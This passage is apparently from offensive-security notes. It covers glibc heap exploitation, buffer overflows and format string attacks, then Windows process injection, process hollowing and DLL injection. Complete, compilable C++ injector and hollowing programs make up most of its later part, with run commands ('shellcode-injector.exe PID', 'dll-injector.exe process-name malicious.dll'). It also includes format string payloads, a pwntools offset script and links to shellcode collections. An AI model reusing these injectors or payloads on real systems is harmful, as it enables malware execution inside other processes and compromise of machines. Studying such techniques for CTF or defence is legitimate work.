To achieve the leak in the memory, we can use Unsorted Bin chunk technique along with [FILE Stream Oriented Programming](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)to leak addresses belong to Glibc thus we can use the leaked addresses to point to other addresses withing Glibc using offsets.

Its very important to examine the heap chunks upon providing any input to the program. You can do that with `pwndbg`

```
pwndbg> vis_heap_chunks
pwndbg> heap
```

**Heap feng shui**

The gist here is to arranging heap blocks and modifying chunk sizes to redirect the program flow into the shellcode or the function that we want to execute. We want to set a new size for the chunks so that it doesn't fit in the Tcache. Upon freeing the chunk again, the heap allocator will treated it as Unsorted Bin Chunk and set `fd` AND `bk` fields to point to an offset of our choosing.

The goal here is to fully control the Tcache which means we need to control a chunk located at the head of the Tcache free-list. Eventually the head of the Tcache will be set to point to a chunk that contained the Glibc pointers.

You can also examine the Tcache bins such as below

```
pwndbg> bins
pwndbg> tcachebins
```

Also you can examine the chunks that you should modify with the below command

```
pwndbg> x/64gx &chunks
```

To start leaking memory addresses, we can first examine The `stdout` (`_IO_2_1_stdout_`) structure

```
pwndbg> p/x _IO_2_1_stdout_
pwndbg> x/28gx &_IO_2_1_stdout_
```

Next we can examine the chunks at `__free_hook`

```
pwndbg> p &__free_hook
```

Then we modify the value of `write_ptr`

Next, we need to enter the address of `system` (offsets can be ignored if the current value here is `0`). Then, we will enter `"/bin/sh\0"` as a number in any chunk, so that calling `free` on it will actually call `system` on the chunk, which will contain the string `"/bin/sh\0"`.

#### Using BOF to control global variables in a program

This is a case where you have the source code of a program. The program has variables defined with different values and they are involved in a process to perform a specific function such as authentication or input validation. There will be times where in order to gain shell, you have first to bypass the progam mechanism of working such as a required authentication or input validation. Here it comes the importance of controlling registers such as \[EBX], \[EAX] and \[ECX]. In some cases and speficially when \[NX] and \[PIE] are enabled, these registers are used to referrence global variables. So by controlling these registers using an overflow you can control the value of the global variables used for the authentication or input validation function.

#### Format String Vulnerability

**Definition** From OWASP,

```
The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
```

Example of a code showing format string vulnerability is below

```
printf("Welcome to HTB!\nPlease enter your name: "); 
fgets(name, 256, stdin); 
printf("Hello, "); 
printf(name);
```

In the above code, we see the function `fgets` to retrieve user input into the variable `name` and then later we see the variable `name` used directly in the `printf(name)`. Here we have a Format String vulnerability since there is a call to `printf` using as first argument a variable controlled by the user. Hence, we can insert formats and potentially dump values from the stack and also write in arbitrary memory addresses. **Format Functions That Cause Format String Vulnerability** The below functions may cause format string vulnerability if no validation or filtering is applied to the arguments that they handle.

```
|fprint|
Writes the printf to a file

|printf|
Output a formatted string

|sprintf|
Prints into a string

|snprintf|
Prints into a string checking the length

|vfprintf|
Prints the a va_arg structure to a file

|vprintf|
Prints the va_arg structure to stdout

|vsprintf|
Prints the va_arg to a string

|vsnprintf|
Prints the va_arg to a string checking the length
```

**Exploitation** Below are format specifiers that can be used as the input to lead/modify data from the stack

```
"%x" Read data from the stack

"%s" Read character strings from the process’ memory

"%n" Write an integer to locations in the process’ memory
```

In format string vulnerabilities, we want not only to read or lead data/memory addresses from the stack but also modify certain parts of it. Therefore, we need first to identify the offset/location where we can control the values inserted. Possible payloads we can try are below \[1]

```
%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
```

\[2]

```
AAAABBBB.%10$lx
%11$lx..AAAABBBB
```

While trying the above payloads, check for repeated patterns in the output sent by the program. An example pattern is below

```
7ffcc59f23e0.0.0.7.7.0.9e5900000240.34000000003.58000000380.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9000a786c25.98000000980
```

Its very clear that starting from position `10` the value `2e786c252e786c25` is shown many times which leads us to conclude that we control user input starting from offset `10` Next, we use `fmtstr_payload` library from `pwn` in `python` to perform an automatic exploitation.

In your code, the payload that you will send as a user input will be similar to the one below

```
payload = fmtstr_payload(offset, {context.binary.sym.<location-to-modify>: value})
```

So in the above payload,

* The offset is the value we found above.
* location-to-modify: represents the function or address in the stack that we wish to modify.
* value: is the value that we want to insert into the function/memory address.
* sym.location-to-modify: will return the memory address of the function we want to modify

#### Resources

Shellcodes database

```
http://shell-storm.org/shellcode/
```

Ready /bin/sh Shellcode

```
https://www.exploit-db.com/exploits/13357
```

A python script to get the offset of a binary. The below script should be run at the same directory of the binary that is vulnerable to BOF.

```python
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './binaryname' # CHANGE-THIS
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# Below is the function that handles the input the binary expects and then sends the pattern. Modify this section according to the user input process of the binary.

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return offset

pattern = cyclic(1024)
offset = getOffset(pattern) 
```

### Process Injection

**Definition** Process injection is commonly used as an overarching term to describe injecting malicious code into a process through legitimate functionality or components. At its most basic level, process injection takes the form of shellcode injection which can be broken into below steps:

1. Open a target process with all access rights: At step one of shellcode injection, we need to open a target process using special parameters. `OpenProcess` is used to open the target process supplied via the command-line.

```cpp
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

2. Allocate target process memory for the shellcode. At step two, we must allocate memory to the byte size of the shellcode. Memory allocation is handled using `VirtualAllocEx`. Within the call, the `dwSize` parameter is defined using the `sizeof` function to get the bytes of shellcode to allocate.

```cpp
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

3. Write shellcode to allocated memory in the target process. At step three, we can now use the allocated memory region to write our shellcode. `WriteProcessMemory` is commonly used to write to memory regions.

```cpp
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```

4. Execute the shellcode using a remote thread o execute the shellcode residing in memory, we can use `CreateRemoteThread`; threads control the execution of processes.

```cpp
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

Full code in C++ for a process injector can be found below

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
    
}
```

Compile the above code and then run it from the command line supplying the PID of the process you wish to inject with your shell code

```
shellcode-injector.exe PID
```

### Process Hollowing

**Definition** Process hollowing offers the ability to inject an entire malicious file into a process. This is accomplished by “hollowing” or un-mapping the process and injecting specific PE (**P**ortable **E**xecutable) data and sections into the process. **Steps of Process Hollowing**

1. Create a target process in a suspended state. At step one of process hollowing, we must create a target process in a suspended state using `CreateProcessA`. To obtain the required parameters for the API call we can use the structures `STARTUPINFOA` and `PROCESS_INFORMATION`.

```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```

2. Open a malicious image. In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using `CreateFileA` to obtain a handle for the malicious image.

```cpp
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
```

Once a handle for the malicious image is obtained, memory must be allocated to the local process using `VirtualAlloc`. `GetFileSize` is also used to retrieve the size of the malicious image for `dwSize`

```cpp
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use `ReadFile` to write to local process memory.

```cpp
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```

3. Un-map legitimate code from process memory. At step three, the process must be “hollowed” by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers `EAX` (entry point), and `EBX` (PEB location) contain the information we need to obtain; these can be found by using `GetThreadContext`. Once both registers are found, `ReadProcessMemory` is used to obtain the base address from the `EBX` with an offset (`0x8`), obtained from examining the PEB.

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
```

After the base address is stored, we can begin un-mapping memory. We can use `ZwUnmapViewOfSection` imported from _ntdll.dll_ to free memory from the target process.

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);
```

4. Allocate memory locations for malicious code and write each section into the address space. At step four, we must begin by allocating memory in the hollowed process. We can use `VirtualAlloc` similar to _step two_ to allocate memory. This time we need to obtain the size of the image found in file headers. `e_lfanew` can identify the number of bytes from the DOS header to the PE header. Once at the PE header, we can obtain the `SizeOfImage` from the Optional header.

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
```

Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use `WriteProcessMemory` and the size of headers to determine where to stop.

```cpp
if (!WriteProcessMemory(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
	NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}
```

Now we need to write each section. To find the number of sections, we can use  `NumberOfSections` from the NT headers. We can loop through `e_lfanew` and the size of the current header to write each section

```cpp
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

	WriteProcessMemory(
		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
		pSectionHeader->SizeOfRawData, // Byte size of current section
		NULL
	);
}
```

5. Set an entry point for the malicious code. At step five, we can use `SetThreadContext` to change `EAX` to point to the entry point.

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to the stored context structure
);
```

6. Take the target process out of a suspended state. At step six, we need to take the process out of a suspended state using `ResumeThread`.

```cpp
ResumeThread(
	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
```

Complete code is below

```cpp
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {

	LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

	// Tested against 32-bit IE.
	LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

	// Change this. Also must be 32-bit. Use project settings from the same project.
	LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

	// Create victim process
	if (!CreateProcessA(
			0,
			(LPSTR)victimImage,
			0,
			0,
			0,
			CREATE_SUSPENDED,
			0,
			0,
			pVictimStartupInfo,
			pVictimProcessInfo)) {
		printf("[-] Failed to create victim process %i\r\n", GetLastError());
		return 1;
	};

	printf("[+] Created victim process\r\n");
	printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);

	
	// Open replacement executable to place inside victim process
	HANDLE hReplacement = CreateFileA(
		replacementImage,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0
	);

	if (hReplacement == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	DWORD replacementSize = GetFileSize(
		hReplacement,
		0);
	printf("[+] Replacement executable opened\r\n");
	printf("\t[*] Size %i bytes\r\n", replacementSize);

	
	// Allocate memory for replacement executable and then load it
	PVOID pReplacementImage = VirtualAlloc(
		0, 
		replacementSize, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	DWORD totalNumberofBytesRead;

	if (!ReadFile(
			hReplacement, 
			pReplacementImage, 
			replacementSize, 
			&totalNumberofBytesRead, 
			0)) {
		printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	CloseHandle(hReplacement);
	printf("[+] Read replacement executable into memory\r\n");
	printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);

	
	// Obtain context / register contents of victim process's primary thread
	CONTEXT victimContext;
	victimContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Obtained context from victim process's primary thread\r\n");
	printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
	printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

	
	// Get base address of the victim executable
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)(victimContext.Ebx + 8), 
		&pVictimImageBaseAddress, 
		sizeof(PVOID), 
		0);
	printf("[+] Extracted image base address of victim process\r\n");
	printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Unmap executable image from victim process	
	DWORD dwResult = NtUnmapViewOfSection(
		pVictimProcessInfo->hProcess,
		pVictimImageBaseAddress);
	if (dwResult) {
		printf("[-] Error unmapping section in victim process\r\n");
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	printf("[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
	printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Allocate memory for the replacement image in the remote process
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
	DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;

	printf("[+] Replacement image metadata extracted\r\n");
	printf("\t[*] replacementImageBaseAddress = 0x%08x\r\n", (UINT)replacementImageBaseAddress);
	printf("\t[*] Replacement process entry point = 0x%08x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	PVOID pVictimHollowedAllocation = VirtualAllocEx(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		sizeOfReplacementImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pVictimHollowedAllocation) {
		printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	printf("[+] Allocated memory in victim process\r\n");
	printf("\t[*] pVictimHollowedAllocation = 0x%08x\r\n", (UINT)pVictimHollowedAllocation);
	
	
	// Write replacement process headers into victim process
	WriteProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)pVictimImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);
	printf("\t[*] Headers written into victim process\r\n");
	
	// Write replacement process sections into victim process
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = 
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pVictimProcessInfo->hProcess, 
			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData, 
			0);
		printf("\t[*] Section %s written into victim process at 0x%08x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header virtual address: 0x%08x\r\n", (UINT)pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n", (UINT)pSectionHeader->PointerToRawData);
	}
	
	
	// Set victim process entry point to replacement image's entry point - change EAX
	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(
		pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
	printf("\t[*] Value is 0x%08x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	
	printf("[+] Resuming victim process primary thread...\n");
	ResumeThread(pVictimProcessInfo->hThread);

	printf("[+] Cleaning up\n");
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);

	return 0;
}
```

Compile the code into exe file, pick a process PID and then execute the process hollowing:

```
process-hollowing.exe PID
```

### DLL Injection

At a high-level DLL injection can be broken up into six steps:

1. Locate a target process to inject. At step one of DLL injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Process32First()`, and `Process32Next()`.
2. Open the target process. At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: `GetModuleHandle`, `GetProcAddress`, or `OpenProcess`.
3. Allocate memory region for malicious DLL. At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using `VirtualAllocEx`.
4. Write the malicious DLL to allocated memory. At step four, we need to write the malicious DLL to the allocated memory location. We can use `WriteProcessMemory` to write to the allocated region.
5. Load and execute the malicious DLL. At step five, our malicious DLL is written to memory and all we need to do is load and execute it. To load the DLL we need to use `LoadLibrary`; imported from `kernel32`. Once loaded, `CreateRemoteThread` can be used to execute memory using `LoadLibrary` as the starting function. **Sample DLL Injector Code**

```cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```

After you compile the code, all you need is to locate a running process, take a note of its name and supply it along with the malicious DLL

```
dll-injector.exe process-name malicious.dll
```
